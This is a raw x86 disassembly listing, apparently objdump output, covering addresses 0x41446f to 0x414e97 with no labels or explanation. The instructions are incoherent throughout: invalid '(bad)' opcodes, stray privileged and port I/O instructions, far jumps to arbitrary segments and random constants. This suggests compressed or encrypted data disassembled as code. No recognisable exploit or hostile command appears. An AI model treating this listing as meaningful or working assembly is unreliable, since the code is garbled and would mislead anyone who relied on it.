  41446f:	cmp    WORD PTR [bp+0x78e1],cx
  414475:	lods   al,BYTE PTR ds:[esi]
  414476:	push   0xffffffc8
  414478:	or     al,BYTE PTR [ecx]
  41447a:	popf   
  41447b:	cmp    edi,eax
  41447d:	sbb    ch,al
  41447f:	lahf   
  414480:	(bad)  
  414481:	fwait
  414482:	or     ebp,ebx
  414484:	add    edx,ebx
  414486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414487:	sti    
  414488:	prefetcht0 BYTE PTR [ecx-0x6a]
  41448c:	jne    0x41441a
  41448e:	fiadd  WORD PTR [esi+0x60]
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x46]
  414501:	jge    0x41448b
  414503:	div    al
  414505:	aad    0x0
  414507:	add    BYTE PTR ds:0x55000001,al
  41450d:	fst    QWORD PTR [edx+0x7f]
  414510:	dec    ebx
  414511:	aas    
  414512:	push   ss
  414513:	push   0xea1d92b2
  414518:	fwait
  414519:	sbb    al,0xb4
  41451b:	pop    edx
  41451c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451d:	out    0x52,eax
  41451f:	or     ah,0x83
  414522:	scas   eax,DWORD PTR es:[edi]
  414523:	jo     0x414525
  414525:	push   ss
  414526:	sbb    BYTE PTR [eax+esi*8],0xf9
  41452a:	scas   eax,DWORD PTR es:[edi]
  41452b:	fimul  DWORD PTR [ebx+0x36]
  41452e:	and    al,0x52
  414530:	in     al,dx
  414531:	iret   
  414532:	jge    0x4144d6
  414534:	jne    0x41455b
  414536:	scas   eax,DWORD PTR es:[edi]
  414537:	imul   edx,DWORD PTR [eax+esi*8],0xffffff9a
  41453b:	dec    edi
  41453c:	iret   
  41453d:	fisub  DWORD PTR [esi-0x6a]
  414540:	and    BYTE PTR [esp+eiz*8-0x35],dl
  414544:	cmp    DWORD PTR [ebp*8+0x1b3b43f5],esi
  41454b:	push   edx
  41454c:	mov    esi,0x17b760a
  414551:	dec    ebp
  414552:	ds arpl di,di
  414555:	mov    eax,0xb3c7e5b6
  41455a:	fsub   DWORD PTR [eax+eax*2-0x5349cb14]
  414561:	or     eax,0x3662b24b
  414566:	cs jp  0x41456d
  414569:	adc    bh,BYTE PTR ds:0x30442e9b
  41456f:	stc    
  414570:	mov    edx,0xffe63df3
  414575:	in     al,dx
  414576:	rcl    bl,0xea
  414579:	fucomp st(2)
  41457b:	div    DWORD PTR [eax+ebp*2-0x758079bc]
  414582:	aad    0x1b
  414584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414585:	add    DWORD PTR [eax+0x5e],0xeb8ce13c
  41458c:	retf   0xc203
  41458f:	push   ebp
  414590:	pop    esi
  414591:	mov    al,ds:0x778091c2
  414596:	xor    BYTE PTR [esi*8+0x790fefc5],cl
  41459d:	ss xor al,0x6
  4145a0:	(bad)  
  4145a1:	pop    esp
  4145a2:	cmp    eax,0xe2e5d2e3
  4145a7:	fisubr DWORD PTR [ebx-0xda9af44]
  4145ad:	ja     0x4145ca
  4145af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145b0:	in     al,dx
  4145b1:	mov    bl,al
  4145b3:	or     eax,0xa12d8192
  4145b8:	adc    al,0xdb
  4145ba:	lods   al,BYTE PTR ds:[esi]
  4145bb:	(bad)  
  4145bc:	inc    esp
  4145bd:	cmp    al,0x1
  4145bf:	xlat   BYTE PTR ds:[ebx]
  4145c0:	push   ebp
  4145c1:	fcomp  QWORD PTR [edx+0x2e]
  4145c4:	jle    0x4145ee
  4145c6:	jge    0x41456c
  4145c8:	mov    ebp,0xae549126
  4145cd:	lahf   
  4145ce:	in     eax,dx
  4145cf:	sbb    edi,DWORD PTR [edx]
  4145d1:	out    dx,al
  4145d2:	xchg   edi,eax
  4145d3:	imul   esi,esi,0x60
  4145d6:	sbb    cl,ch
  4145d8:	test   bl,0x2c
  4145db:	in     eax,0x6
  4145dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145de:	cmc    
  4145df:	aas    
  4145e0:	mov    ebx,0xe8e682da
  4145e5:	mov    cl,BYTE PTR [ecx+0x71]
  4145e8:	xlat   BYTE PTR ds:[ebx]
  4145e9:	push   esp
  4145ea:	push   cs
  4145eb:	cld    
  4145ec:	or     BYTE PTR [ebp-0x10],0x6b
  4145f0:	int3   
  4145f1:	lock push ebx
  4145f3:	inc    eax
  4145f4:	and    ch,BYTE PTR [esi]
  4145f6:	dec    ebx
  4145f7:	xchg   ecx,esp
  4145f9:	rcl    BYTE PTR [edi],1
  4145fb:	sub    al,BYTE PTR [eax-0x56af36be]
  414601:	adc    ch,BYTE PTR [edx]
  414603:	test   al,0x45
  414605:	mov    ebx,ecx
  414607:	hlt    
  414608:	ds pop ecx
  41460a:	aam    0x64
  41460c:	adc    BYTE PTR [edi-0x60],dh
  41460f:	jmp    0x0:0xbc
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xe6
  414681:	xchg   esi,eax
  414682:	lock dec esp
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x1d000001
  41468d:	dec    ebp
  41468e:	aad    0x32
  414690:	pop    esi
  414691:	jmp    0x770db64d
  414696:	cmp    ah,BYTE PTR [edi]
  414698:	ficom  DWORD PTR [edi-0x2874bbf9]
  41469e:	es adc eax,0x59bde759
  4146a4:	enter  0x588,0xa3
  4146a8:	xor    al,0x69
  4146aa:	aaa    
  4146ab:	stc    
  4146ac:	push   esi
  4146ad:	outs   dx,DWORD PTR ds:[esi]
  4146ae:	or     DWORD PTR [esp+ecx*2],ecx
  4146b1:	jmp    0x414676
  4146b3:	in     eax,0xd
  4146b5:	ins    BYTE PTR es:[edi],dx
  4146b6:	mov    ds:0xef22e772,eax
  4146bb:	call   0xd69a56b7
  4146c0:	ins    BYTE PTR es:[edi],dx
  4146c1:	jg     0x41472c
  4146c3:	pop    edx
  4146c4:	lods   eax,DWORD PTR ds:[esi]
  4146c5:	sahf   
  4146c6:	scas   eax,DWORD PTR es:[edi]
  4146c7:	push   ecx
  4146c8:	push   0x6
  4146ca:	je     0x414723
  4146cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146cd:	mov    eax,ds:0xf1d773fe
  4146d2:	jp     0x41468f
  4146d4:	scas   al,BYTE PTR es:[edi]
  4146d5:	iret   
  4146d6:	ja     0x4146b1
  4146d8:	mov    edx,0x76a39ae7
  4146dd:	loope  0x4146e6
  4146df:	lea    ebp,[ecx]
  4146e1:	xor    al,BYTE PTR [ecx+edx*1+0x6d]
  4146e5:	jo     0x414676
  4146e7:	push   ss
  4146e8:	pushf  
  4146e9:	cmp    eax,0xa552a985
  4146ee:	jns    0x4146f7
  4146f0:	jge    0x41470a
  4146f2:	mov    DWORD PTR [ebp-0x3d35bb19],ebp
  4146f8:	or     bh,ah
  4146fa:	pop    ss
  4146fb:	pop    edx
  4146fc:	xchg   edx,eax
  4146fd:	fcmovnu st,st(4)
  4146ff:	jl     0x4146e5
  414701:	sar    DWORD PTR [ebp-0x31],cl
  414704:	stos   BYTE PTR es:[edi],al
  414705:	ror    BYTE PTR ds:0x6794528a,1
  41470b:	inc    edx
  41470c:	pop    esp
  41470d:	jae    0x414712
  41470f:	scas   al,BYTE PTR es:[edi]
  414710:	sbb    BYTE PTR [edx],cl
  414712:	jbe    0x41475d
  414714:	dec    ebx
  414715:	inc    esp
  414716:	adc    DWORD PTR [ecx+eax*1+0x13],eax
  41471a:	sbb    al,BYTE PTR [ebp-0x49]
  41471d:	jo     0x414721
  41471f:	popf   
  414720:	inc    eax
  414721:	lods   eax,DWORD PTR ds:[esi]
  414722:	xor    dh,BYTE PTR [ebp+0x16]
  414725:	push   ss
  414726:	lods   eax,DWORD PTR ds:[esi]
  414727:	pop    eax
  414728:	test   ecx,eax
  41472a:	fst    QWORD PTR [esi-0x9]
  41472d:	and    eax,0xf127bb5
  414732:	std    
  414733:	int3   
  414734:	(bad)  
  414735:	enter  0xf5c5,0x95
  414739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41473a:	sub    edx,DWORD PTR [ebp+0x56]
  41473d:	inc    esp
  41473e:	cdq    
  41473f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414740:	stos   BYTE PTR es:[edi],al
  414741:	test   al,0x33
  414743:	xor    ebp,DWORD PTR [edx+edi*8]
  414746:	inc    ebx
  414747:	mov    eax,ds:0xb81a85e8
  41474c:	mov    ds:0x5deaa1ac,al
  414751:	sti    
  414752:	mov    ds:0x82f5188c,eax
  414757:	cs push ss
  414759:	inc    esi
  41475a:	mov    al,0x2b
  41475c:	or     bh,BYTE PTR [edi+0x78]
  41475f:	stc    
  414760:	sbb    DWORD PTR [ecx],eax
  414762:	push   edx
  414763:	mov    fs,esi
  414765:	jmp    0x5e29:0x7a75e106
  41476c:	mov    DWORD PTR [edx-0x5624357e],ecx
  414772:	xor    BYTE PTR [edx],al
  414774:	fsubr  DWORD PTR [ecx+edx*2]
  414777:	dec    ebp
  414778:	mov    dl,0xe4
  41477a:	pop    ds
  41477b:	addr16 mov ebp,0x519433ce
  414781:	mov    ecx,0xa5208ff8
  414786:	mov    ebx,0xa79f6b00
  41478b:	cwde   
  41478c:	dec    eax
  41478d:	dec    ebp
  41478e:	and    esp,DWORD PTR ds:0xeb
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x35f14289
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x32000001
  41480d:	mov    bh,0x6c
  41480f:	xchg   ecx,eax
  414810:	xchg   esi,eax
  414811:	in     al,dx
  414812:	mov    WORD PTR [edi-0x75],cs
  414815:	add    al,0x79
  414817:	int3   
  414818:	xor    DWORD PTR [edi-0x2],0xffffff9c
  41481c:	xchg   BYTE PTR [ecx+ebp*1],cl
  41481f:	add    eax,0xd4f344b1
  414824:	add    al,0x7a
  414826:	and    BYTE PTR [edi-0xff8572e],ch
  41482c:	jnp    0x41483e
  41482e:	repnz or DWORD PTR [edi],edx
  414831:	cdq    
  414832:	push   esi
  414833:	sar    DWORD PTR [edx],1
  414835:	aam    0x3b
  414837:	inc    esp
  414838:	daa    
  414839:	call   0x9c2cb0dd
  41483e:	mov    edx,0x50fb54f7
  414843:	push   DWORD PTR [edi]
  414845:	jle    0x414861
  414847:	mov    ebp,DWORD PTR [ecx]
  414849:	sub    BYTE PTR [esi-0x3006d517],bh
  41484f:	mov    dh,0xd5
  414851:	mov    cl,0x40
  414853:	ret    
  414854:	adc    al,BYTE PTR [eax-0x33]
  414857:	add    cl,BYTE PTR [edx+0x5500a496]
  41485d:	and    eax,DWORD PTR [edi+0x61]
  414860:	sbb    ebx,DWORD PTR ds:0xe3ce1bd2
  414866:	pop    edi
  414867:	jbe    0x41489d
  414869:	push   ds
  41486a:	push   ds
  41486b:	jmp    0x7626:0x5cc2b8a7
  414872:	sub    cl,dl
  414874:	or     DWORD PTR [eax+0x1c],0x21aadd00
  41487b:	jno    0x4148e2
  41487d:	not    edx
  41487f:	and    eax,0x60e56390
  414884:	dec    edi
  414885:	je     0x414833
  414887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414888:	(bad)  
  414889:	cli    
  41488a:	cld    
  41488b:	ds dec esp
  41488d:	inc    esi
  41488e:	inc    edx
  41488f:	mov    ecx,edi
  414891:	mov    BYTE PTR [eax],ch
  414893:	fnsave [ebx-0x79]
  414896:	mov    ebp,0x44b7054d
  41489b:	sub    edi,DWORD PTR [edx+0x68]
  41489e:	stos   DWORD PTR es:[edi],eax
  41489f:	adc    al,0xa3
  4148a1:	or     BYTE PTR [edx-0x711deef0],ah
  4148a7:	nop
  4148a8:	adc    BYTE PTR [eax-0x22],0xb5
  4148ac:	xchg   DWORD PTR ds:0x999a4ca8,edi
  4148b2:	and    al,BYTE PTR [esi+0x2a]
  4148b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b6:	je     0x41491b
  4148b8:	xor    BYTE PTR [ebx+0x3161112a],ah
  4148be:	push   esi
  4148bf:	mov    cl,0x4d
  4148c1:	les    ecx,FWORD PTR [esi-0x5f318bb3]
  4148c7:	aaa    
  4148c8:	je     0x414918
  4148ca:	idiv   ebp
  4148cc:	cmp    BYTE PTR [eax+0x17fce66c],ah
  4148d2:	sub    eax,0xebadb556
  4148d7:	and    DWORD PTR [ecx],ebp
  4148d9:	jnp    0x41487a
  4148db:	pop    ds
  4148dc:	jmp    0xd77690ee
  4148e1:	or     DWORD PTR [ebp+0x4903658e],ecx
  4148e7:	lahf   
  4148e8:	cmp    DWORD PTR [edx+0x11],ebp
  4148eb:	paddsb mm6,QWORD PTR [eax-0x9]
  4148ef:	fist   DWORD PTR ds:0x663c139c
  4148f5:	cwde   
  4148f6:	out    dx,al
  4148f7:	out    0x2f,eax
  4148f9:	xchg   edi,eax
  4148fa:	lahf   
  4148fb:	test   DWORD PTR [ebx+0x489b4e10],edi
  414901:	push   ebx
  414902:	mov    edx,edi
  414904:	outs   dx,BYTE PTR ds:[esi]
  414905:	imul   DWORD PTR [edi]
  414907:	cs jecxz 0x414899
  41490a:	int    0x3d
  41490c:	inc    esp
  41490d:	mov    ds:0x8f38b4,al
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	jle    0x41497c
  414982:	xchg   BYTE PTR ds:0xd8ff,ch
  414988:	add    eax,0xf5000001
  41498d:	xor    BYTE PTR [esi+0x7130cd55],dh
  414993:	jnp    0x4149e3
  414995:	pop    esp
  414996:	mul    DWORD PTR [ecx-0x36]
  414999:	mov    ah,0xa5
  41499b:	pop    esi
  41499c:	ins    DWORD PTR es:[edi],dx
  41499d:	jecxz  0x4149df
  41499f:	cmp    eax,DWORD PTR [edx-0x44]
  4149a2:	cli    
  4149a3:	jb     0x414963
  4149a5:	pop    edi
  4149a6:	out    0x63,eax
  4149a8:	and    dl,bl
  4149aa:	dec    edx
  4149ab:	popa   
  4149ac:	jns    0x4149fd
  4149ae:	and    al,0x26
  4149b0:	xor    eax,0xd6452771
  4149b5:	dec    ebx
  4149b6:	mov    eax,0x9be9e464
  4149bb:	sub    ebx,esi
  4149bd:	mov    WORD PTR [ebx+0x3],ss
  4149c0:	not    BYTE PTR [edx]
  4149c2:	xor    eax,0x52fbb43
  4149c7:	scas   eax,DWORD PTR es:[edi]
  4149c8:	adc    bl,ah
  4149ca:	pop    esi
  4149cb:	sbb    al,0x98
  4149cd:	retf   
  4149ce:	ret    
  4149cf:	imul   eax,DWORD PTR [ebx+edi*8+0x7d5164f3],0x20c89c5
  4149da:	adc    eax,0xda9a32dd
  4149df:	aam    0xd8
  4149e1:	and    esi,DWORD PTR [ebp-0x1]
  4149e4:	mov    esi,0xfbefdc3e
  4149e9:	fwait
  4149ea:	mov    edi,0xefe8e237
  4149ef:	sti    
  4149f0:	mov    bl,0xf0
  4149f2:	cmp    al,0xdd
  4149f4:	mov    ebx,0x806fdb7e
  4149f9:	ror    DWORD PTR [ebx],0x98
  4149fc:	imul   DWORD PTR [esi]
  4149fe:	dec    esp
  4149ff:	xchg   ebx,eax
  414a00:	adc    al,0x91
  414a02:	cs jbe 0x41498b
  414a05:	mov    bh,0x9a
  414a07:	lea    ebx,[edx]
  414a09:	sub    DWORD PTR [ebp+0x69],0x4fe75bee
  414a10:	pop    edi
  414a11:	out    0x77,al
  414a13:	cdq    
  414a14:	inc    eax
  414a15:	mov    ebp,0x646e37c9
  414a1a:	xlat   BYTE PTR ds:[ebx]
  414a1b:	shr    DWORD PTR [ebp-0x11b3fd3e],0x16
  414a22:	or     eax,0xbb18c4ee
  414a27:	aaa    
  414a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a29:	sbb    ebx,edx
  414a2b:	and    ch,0x19
  414a2e:	ins    BYTE PTR es:[edi],dx
  414a2f:	stos   BYTE PTR es:[edi],al
  414a30:	xor    eax,0xbcf78deb
  414a35:	push   edx
  414a36:	pop    esp
  414a37:	es mov ebx,0xf128852b
  414a3d:	push   eax
  414a3e:	pop    eax
  414a3f:	adc    al,0x13
  414a41:	xchg   edi,eax
  414a42:	loope  0x414a90
  414a44:	hlt    
  414a45:	mov    bl,0xe3
  414a47:	xor    DWORD PTR [ebx-0x36],0xed8cdffe
  414a4e:	push   ss
  414a4f:	(bad)  
  414a50:	mov    edx,0xc3427d02
  414a55:	cmp    DWORD PTR [ebp-0x2ac96b31],edi
  414a5b:	cli    
  414a5c:	fist   DWORD PTR [edi+0x11]
  414a5f:	push   ds
  414a60:	es cmp dh,ch
  414a63:	fadd   DWORD PTR [ebp-0x22c8909c]
  414a69:	cmp    al,0xb9
  414a6b:	int3   
  414a6c:	sbb    BYTE PTR [esi-0x501c143e],cl
  414a72:	lock sbb BYTE PTR [edi+ebx*4-0xd],bh
  414a77:	pop    eax
  414a78:	jge    0x414aa7
  414a7a:	(bad)  
  414a7b:	push   esp
  414a7c:	fisttp WORD PTR [eax+0x3]
  414a7f:	iret   
  414a80:	stos   DWORD PTR es:[edi],eax
  414a81:	dec    ecx
  414a82:	push   esp
  414a83:	dec    edi
  414a84:	sbb    ebx,ebp
  414a86:	pop    edi
  414a87:	and    DWORD PTR [ebp*1-0xf4e3db7],0xffffffad
  414a8f:	and    bh,cl
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [edx],bx
  414b01:	add    al,BYTE PTR [edx]
  414b03:	mov    bh,0x4
  414b05:	fiadd  DWORD PTR [eax]
  414b07:	add    BYTE PTR ds:0xec000001,al
  414b0d:	mov    edi,0xfd5480b6
  414b12:	out    0xea,al
  414b14:	aad    0xc8
  414b16:	ficom  WORD PTR [edx+0x37]
  414b19:	bound  edx,QWORD PTR [esi]
  414b1b:	cli    
  414b1c:	push   es
  414b1d:	add    DWORD PTR [eax-0x657a4cea],edx
  414b23:	arpl   WORD PTR [ebx+0x1c],dx
  414b26:	ret    0x1c61
  414b29:	dec    eax
  414b2a:	iret   
  414b2b:	in     al,0x16
  414b2d:	jno    0x414b25
  414b2f:	sbb    eax,0xe10fc18d
  414b34:	pop    ebx
  414b35:	gs xor al,0x9b
  414b38:	xchg   ebx,eax
  414b39:	out    dx,eax
  414b3a:	sbb    BYTE PTR [edx],bh
  414b3c:	cdq    
  414b3d:	retf   0x7f04
  414b40:	mov    ebp,0xba9e613
  414b45:	mov    bh,0xe1
  414b47:	dec    edx
  414b48:	lds    eax,FWORD PTR ds:0x1e10796a
  414b4e:	or     BYTE PTR [edi-0x44],ch
  414b51:	out    0xb0,eax
  414b53:	(bad)  
  414b54:	dec    ebx
  414b55:	add    esi,esi
  414b57:	mov    dl,0x3c
  414b59:	pop    ss
  414b5a:	inc    edx
  414b5b:	js     0x414b63
  414b5d:	and    BYTE PTR [edx+0x4a5d5027],cl
  414b63:	repnz sub eax,0x9a813994
  414b69:	ret    
  414b6a:	inc    esp
  414b6b:	or     dl,ah
  414b6d:	jp     0x414b2c
  414b6f:	inc    ebp
  414b70:	lea    eax,[ecx+0x46535a50]
  414b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b77:	stos   DWORD PTR es:[edi],eax
  414b78:	jo     0x414b00
  414b7a:	shl    DWORD PTR [ecx+edi*8+0x1a33052a],cl
  414b81:	mov    edx,0x65d772bd
  414b86:	push   eax
  414b87:	jmp    0xadc7:0xb3409ca4
  414b8e:	psrad  mm1,QWORD PTR [ebx+eiz*2+0x75]
  414b93:	sbb    al,0x4c
  414b95:	xchg   edi,eax
  414b96:	mov    edx,0x3631dd7c
  414b9b:	cmp    DWORD PTR [eax+0x27c54a4c],ebx
  414ba1:	scas   al,BYTE PTR es:[edi]
  414ba2:	sbb    DWORD PTR [esi+0x11],esi
  414ba5:	mov    DWORD PTR [ecx],ebx
  414ba7:	in     eax,0xfc
  414ba9:	je     0x414b49
  414bab:	cdq    
  414bac:	stos   BYTE PTR es:[edi],al
  414bad:	out    0x8a,al
  414baf:	repnz mov BYTE PTR [ebx],0x6
  414bb3:	ja     0x414bac
  414bb5:	xchg   edi,eax
  414bb6:	xchg   ecx,eax
  414bb7:	cwde   
  414bb8:	loope  0x414c22
  414bba:	sub    BYTE PTR [ebx+0x3a792135],dh
  414bc0:	mov    ?,WORD PTR ss:[ebp-0x4043ee42]
  414bc7:	es push 0xffffffe7
  414bca:	push   ebx
  414bcb:	addr16 shr bl,0xca
  414bcf:	mov    eax,ds:0x9126b4b2
  414bd4:	(bad)  
  414bd5:	out    dx,eax
  414bd6:	mov    es,WORD PTR [ecx]
  414bd8:	jle    0x414b76
  414bda:	adc    DWORD PTR [eax-0x6aba4e33],ebp
  414be0:	cmp    eax,0x2e5ae08
  414be5:	xchg   esp,eax
  414be6:	inc    ebx
  414be7:	add    dh,0xf8
  414bea:	add    BYTE PTR [ebp+0x214ddc9d],ch
  414bf0:	xor    DWORD PTR [ebp+edx*1+0xe388544],ebp
  414bf7:	mov    bl,0x2d
  414bf9:	pop    eax
  414bfa:	jg     0x414b9e
  414bfc:	scas   eax,DWORD PTR es:[edi]
  414bfd:	es (bad) 
  414bff:	enter  0x9da3,0xd2
  414c03:	and    al,0x6d
  414c05:	mov    ecx,0x6041a3af
  414c0a:	aad    0x4d
  414c0c:	ins    DWORD PTR es:[edi],dx
  414c0d:	xor    al,0x15
  414c0f:	sahf   
  414c10:	jae    0x414c12
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    eax,DWORD PTR cs:[esi+0x9906a1b]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0x6f000001,al
  414c8d:	test   al,0xb1
  414c8f:	cmp    DWORD PTR [esi+0x783e58a3],edx
  414c95:	(bad)  
  414c96:	push   esp
  414c97:	enter  0xbd8f,0xe7
  414c9b:	pop    ds
  414c9c:	push   0xffffff92
  414c9e:	(bad)  
  414c9f:	ficomp WORD PTR [edx+0x25]
  414ca2:	xor    eax,0x966376fc
  414ca7:	rcr    DWORD PTR [ecx+0x4c8e85a8],1
  414cad:	pusha  
  414cae:	ss pop ss
  414cb0:	call   0xd9f1:0x978e1639
  414cb7:	loopne 0x414d37
  414cb9:	mov    BYTE PTR [edx],ah
  414cbb:	sbb    eax,0x5b0003ab
  414cc0:	jecxz  0x414c4c
  414cc2:	push   esp
  414cc3:	or     esp,edi
  414cc5:	lods   al,BYTE PTR ds:[esi]
  414cc6:	mov    DWORD PTR [esi-0x136af2],ebp
  414ccc:	icebp  
  414ccd:	mov    bl,0x60
  414ccf:	push   ebp
  414cd0:	inc    eax
  414cd1:	mov    bl,0xb9
  414cd3:	test   edi,0xc5221ddf
  414cd9:	sbb    al,0xeb
  414cdb:	push   ebx
  414cdc:	inc    esp
  414cdd:	jmp    0x414d44
  414cdf:	pop    esi
  414ce0:	vcvtsi2sd xmm1,xmm3,esp
  414ce4:	push   eax
  414ce5:	inc    esi
  414ce6:	mov    es,WORD PTR [ecx-0x7f]
  414ce9:	ins    BYTE PTR es:[edi],dx
  414cea:	adc    BYTE PTR [edx+ebx*1-0x49393e5],dl
  414cf1:	add    edx,DWORD PTR [esi]
  414cf3:	scas   eax,DWORD PTR es:[edi]
  414cf4:	dec    edx
  414cf5:	add    DWORD PTR [ecx+0x6411a4e8],ebp
  414cfb:	retf   0xb9ad
  414cfe:	xchg   ebx,eax
  414cff:	jo     0x414cb5
  414d01:	cmp    al,al
  414d03:	jo     0x414d52
  414d05:	jno    0x414d3e
  414d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d08:	pop    ebp
  414d09:	xor    ah,ch
  414d0b:	cmp    edi,0xffffffe2
  414d0e:	and    DWORD PTR [edx+0x45],esp
  414d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d12:	imul   ebp,DWORD PTR [eax-0x41],0x26
  414d16:	(bad)  
  414d17:	hlt    
  414d18:	stos   DWORD PTR es:[edi],eax
  414d19:	mov    al,0xae
  414d1b:	mov    ecx,0x8901c056
  414d20:	sub    DWORD PTR [ebx],ecx
  414d22:	add    eax,0xa44848c5
  414d27:	in     al,dx
  414d28:	outs   dx,DWORD PTR ds:[esi]
  414d29:	push   ds
  414d2a:	push   cs
  414d2b:	outs   dx,DWORD PTR ds:[esi]
  414d2c:	inc    edi
  414d2d:	dec    esi
  414d2e:	jnp    0x414d42
  414d30:	xor    BYTE PTR [eax],cl
  414d32:	jle    0x414d28
  414d34:	in     eax,dx
  414d35:	hlt    
  414d36:	sbb    DWORD PTR [ecx+ebx*8],esi
  414d39:	pop    es
  414d3a:	(bad)  
  414d3b:	lea    esi,[edx+0x69]
  414d3e:	mov    WORD PTR [edi+0x37],ss
  414d41:	call   0x9c1a:0xd4ab0376
  414d48:	mov    al,ds:0xa4239cc0
  414d4d:	pushf  
  414d4e:	cld    
  414d4f:	adc    ecx,DWORD PTR [edi+esi*2+0x7]
  414d53:	mov    dl,0xab
  414d55:	mov    ebp,0xbb0848c3
  414d5a:	clc    
  414d5b:	xor    al,BYTE PTR [ebx-0x29896ce7]
  414d61:	scas   al,BYTE PTR es:[edi]
  414d62:	stos   DWORD PTR es:[edi],eax
  414d63:	sub    al,0xb3
  414d65:	dec    esp
  414d66:	mov    eax,0x90f91d4b
  414d6b:	sbb    dl,bh
  414d6d:	xor    ah,bh
  414d6f:	adc    DWORD PTR ds:0x1463628d,ebx
  414d75:	scas   al,BYTE PTR es:[edi]
  414d76:	inc    esi
  414d77:	fidiv  WORD PTR [eax]
  414d79:	or     al,0x7d
  414d7b:	push   0x4768e1b9
  414d80:	inc    esp
  414d81:	popf   
  414d82:	xchg   esi,eax
  414d83:	hlt    
  414d84:	int    0x29
  414d86:	xlat   BYTE PTR ds:[ebx]
  414d87:	mov    ah,0x10
  414d89:	inc    edi
  414d8a:	cmp    al,0x9e
  414d8c:	out    dx,al
  414d8d:	(bad)  
  414d8e:	(bad)  
  414d8f:	cld    
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x52415d2
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x7b000001,al
  414e0d:	pop    ecx
  414e0e:	adc    BYTE PTR [esi],0xb6
  414e11:	arpl   WORD PTR [edi],ax
  414e13:	(bad)  
  414e14:	xchg   DWORD PTR [edx+esi*8-0x72],ebp
  414e18:	xchg   esp,eax
  414e19:	arpl   WORD PTR [esp-0x19],cx
  414e1d:	out    dx,eax
  414e1e:	pop    ss
  414e1f:	mov    ecx,ebx
  414e21:	add    ebp,ebx
  414e23:	arpl   WORD PTR [edi+ebp*2+0x6f],ax
  414e27:	enter  0xda1e,0xd8
  414e2b:	sahf   
  414e2c:	fs ret 
  414e2e:	or     bh,bh
  414e30:	ja     0x414e4b
  414e32:	test   al,0x5a
  414e34:	jae    0x414db6
  414e36:	popa   
  414e37:	cdq    
  414e38:	or     ecx,DWORD PTR [eax-0x6b]
  414e3b:	mov    esp,0x87ba57c9
  414e40:	xor    edi,eax
  414e42:	xchg   edx,eax
  414e43:	ins    BYTE PTR es:[edi],dx
  414e44:	cmc    
  414e45:	ins    DWORD PTR es:[edi],dx
  414e46:	icebp  
  414e47:	and    BYTE PTR [ebx],dh
  414e49:	cmp    BYTE PTR [eax+ecx*2-0x5c],al
  414e4d:	lods   al,BYTE PTR ds:[esi]
  414e4e:	and    al,0x7f
  414e50:	mov    esp,DWORD PTR [ecx-0x3a]
  414e53:	je     0x414e7f
  414e55:	addr16 std 
  414e57:	xchg   edx,eax
  414e58:	xor    dh,BYTE PTR [eax-0x5f]
  414e5b:	sub    ax,0xe354
  414e5f:	xor    BYTE PTR ds:0x3032c7a6,cl
  414e65:	jp     0x414e17
  414e67:	xor    al,0xc0
  414e69:	mov    eax,ds:0x29d267f3
  414e6e:	pop    ds
  414e6f:	jbe    0x414ee1
  414e71:	(bad)  
  414e72:	xchg   ch,al
  414e74:	add    DWORD PTR [edx],ecx
  414e76:	repnz fs out dx,eax
  414e79:	adc    al,0x33
  414e7b:	shl    DWORD PTR [edx],0x23
  414e7e:	cmp    eax,0xc1f4e785
  414e83:	sbb    ah,dl
  414e85:	xor    al,BYTE PTR [esi-0x2fbb1076]
  414e8b:	cmp    ch,BYTE PTR [ebx-0xde23fcb]
  414e91:	mov    ch,0x25
  414e93:	fcom   st(3)
  414e95:	repnz (bad) 
  414e97:	dec    edi
